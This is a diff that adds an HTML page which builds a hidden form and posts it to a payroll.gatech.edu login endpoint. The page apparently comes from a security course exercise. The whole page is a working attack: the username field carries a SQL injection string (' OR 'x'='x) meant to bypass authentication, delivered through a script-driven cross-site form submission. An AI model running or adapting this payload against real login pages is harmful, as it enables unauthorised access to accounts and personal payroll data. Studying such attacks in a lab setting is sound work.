@@ -1,0 +1,42 @@
+<script src="http://payroll.gatech.edu/assets/jquery/js/jquery-1.7.2.min.js"></script>
+<body>
+<form action="http://payroll.gatech.edu/" onsubmit="" method="POST">
+    <!-- same drill. forms in this format if you need it-->
+
+    <input name="login" id="targetlogin" value="Dan">
+    <button id="exploit" onclick="displayLogin()">Submit</button>
+    <!--<input type="hidden" name="storeUsername" value="<script>return displayLogin()</script>">-->
+
+
+
+    <script type="text/javascript">
+        //        document.getElementById("exploit").click(); //simulate clicking on Log In
+        // check username from database
+
+        // SQL querry returning all info
+        function displayLogin() {
+            var enteredName = document.getElementById("targetlogin").value;
+            // setup target username to enter for injection
+            var injection = enteredName + "' OR 'x'='x";
+            loginPage(injection);
+        }
+        // if matches:
+
+        //  redirect and login to payroll.gatech.edu/account.php
+        function loginPage(inject) {
+
+
+            $('<form action="http://payroll.gatech.edu/index.php" method="POST">' +
+                    '<input type="hidden" name="secret" value="whatdoido?">' +
+                    '<input type="text" name="login" value="'+inject+'" ">' +
+                    ' <input type="password" name="pw" value = " ">' +
+                    '<input name="action" value="login">' +
+                    '</form>').appendTo($(document.body)).submit();
+            alert('loginPage ran: ' + inject);
+        }
+        //  document.getElementsByName("action").click(); //simulate clicking on Log In
+
+    </script>
+
+</form>
+</body>
